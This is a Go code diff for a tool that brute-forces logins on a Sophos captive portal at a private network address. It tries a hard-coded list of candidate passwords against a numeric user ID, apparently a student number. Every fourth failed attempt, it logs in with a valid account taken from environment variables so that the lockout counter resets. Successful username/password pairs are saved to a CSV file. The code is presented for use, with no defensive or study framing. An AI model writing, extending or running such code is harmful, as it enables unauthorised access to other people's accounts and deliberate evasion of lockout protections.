@@ -1,14 +1,19 @@
 package main
 
 import (
+	"encoding/csv"
 	"encoding/xml"
 	"fmt"
 	"io/ioutil"
+	"log"
 	"net/http"
+	"os"
+	"path/filepath"
 	"strings"
+	"time"
 )
 
-var passwordList = []string{
+var passwords = []string{
 	"157030AR",
 	"216031IM",
 	"268032SH",
@@ -69,15 +74,61 @@ type Requestresponse struct {
 }
 
 func main() {
-	//
+	// get correct password and username from env vars
+	correctUsername := os.Getenv("SOPHOS_USERNAME")
+	correctPassword := os.Getenv("SOPHOS_PASSWORD")
 
-	err := logout("9919103015")
+	currDir, err := os.Getwd()
 	if err != nil {
-		fmt.Println(err)
+		log.Fatalln(err)
 	}
+
+	csvFile, err := os.OpenFile(filepath.Join(currDir, "matched.csv"), os.O_WRONLY|os.O_CREATE|os.O_APPEND, 0600)
+	if err != nil {
+		log.Panicln(err)
+	}
+
+	csvWriter := csv.NewWriter(csvFile)
+
+	var wrongAttempts = 0
+	for i := 19102158; i <= 19102158; i++ {
+		for _, pwd := range passwords {
+
+			// reset to prevent timeout due to to many bad login attempts
+			if wrongAttempts == 4 {
+				wrongAttempts = 0
+				err := resetLogins(correctUsername, correctPassword)
+				if err != nil {
+					log.Fatalln(err)
+				}
+			}
+
+			fmt.Println(fmt.Sprint(i),fmt.Sprint(pwd))
+			res, err := login(fmt.Sprint(i), fmt.Sprint(pwd))
+			if err != nil {
+				//log.Println(res)
+				log.Println(err)
+				wrongAttempts++
+				continue
+			} else {
+				_, err = logout(fmt.Sprint(correctUsername))
+				if err != nil {
+					log.Println(err)
+				}
+				err := csvWriter.Write([]string{fmt.Sprint(i), pwd})
+				if err != nil {
+					log.Fatalln(err)
+				}
+				csvWriter.Flush()
+				fmt.Println(res)
+				break
+			}
+		}
+	}
+
 }
 
-func login(username string, password string) error {
+func login(username string, password string) (*Requestresponse, error) {
 	url := "http://172.16.68.6:8090/login.xml"
 	method := "POST"
 
@@ -87,37 +138,36 @@ func login(username string, password string) error {
 	req, err := http.NewRequest(method, url, payload)
 
 	if err != nil {
-		return err
+		return nil, err
 	}
 	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
 
 	res, err := client.Do(req)
 	if err != nil {
-		return err
+		return nil, err
 	}
 	defer res.Body.Close()
 
 	body, err := ioutil.ReadAll(res.Body)
 	if err != nil {
-		return err
+		return nil, err
 	}
 
-	var some Requestresponse
-	err = xml.Unmarshal(body, &some)
+	var parsedResponse Requestresponse
+	err = xml.Unmarshal(body, &parsedResponse)
 	if err != nil {
 		fmt.Println(err)
-		return err
+		return nil, err
 	}
 
-	if !strings.Contains(some.Message, "You are signed in as {username}") {
-		return fmt.Errorf("error logging in")
+	if !strings.Contains(parsedResponse.Message, "You are signed in as {username}") {
+		return &parsedResponse, fmt.Errorf("error logging in")
 	}
-	fmt.Println(some)
 
-	return nil
+	return &parsedResponse, nil
 }
 
-func logout(username string) error {
+func logout(username string) (*Requestresponse, error) {
 	url := "http://172.16.68.6:8090/logout.xml"
 	method := "POST"
 
@@ -125,34 +175,49 @@ func logout(username string) error {
 
 	client := &http.Client{}
 	req, err := http.NewRequest(method, url, payload)
-
 	if err != nil {
-		return err
+		return nil, err
 	}
+
 	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
 
 	res, err := client.Do(req)
 	if err != nil {
-		return err
+		return nil, err
 	}
 	defer res.Body.Close()
 
 	body, err := ioutil.ReadAll(res.Body)
 	if err != nil {
-		return err
+		return nil, err
 	}
 
-	var some Requestresponse
-	err = xml.Unmarshal(body, &some)
+	var parsedResponse Requestresponse
+	err = xml.Unmarshal(body, &parsedResponse)
 	if err != nil {
-		fmt.Println(err)
-		return err
+		return nil, err
 	}
 
-	if !strings.Contains(some.Message, "You&#39;ve signed out") {
-		return fmt.Errorf("error logging out")
+	if !strings.Contains(parsedResponse.Message, "You&#39;ve signed out") {
+		return &parsedResponse, fmt.Errorf("error logging out")
 	}
-	fmt.Println(some)
+
+	return &parsedResponse, nil
+}
+
+func resetLogins(correctUsername string, correctPassword string) error {
+	_, err := login(fmt.Sprint(correctUsername), fmt.Sprint(correctPassword))
+	if err != nil {
+		return err
+	}
+	//log.Println(res)
+	log.Println("Logged in as", correctUsername)
+	time.Sleep(2 * time.Second)
+
+	_, err = logout(fmt.Sprint(correctUsername))
+	if err != nil {
+		return err
+	}
 
 	return nil
 }
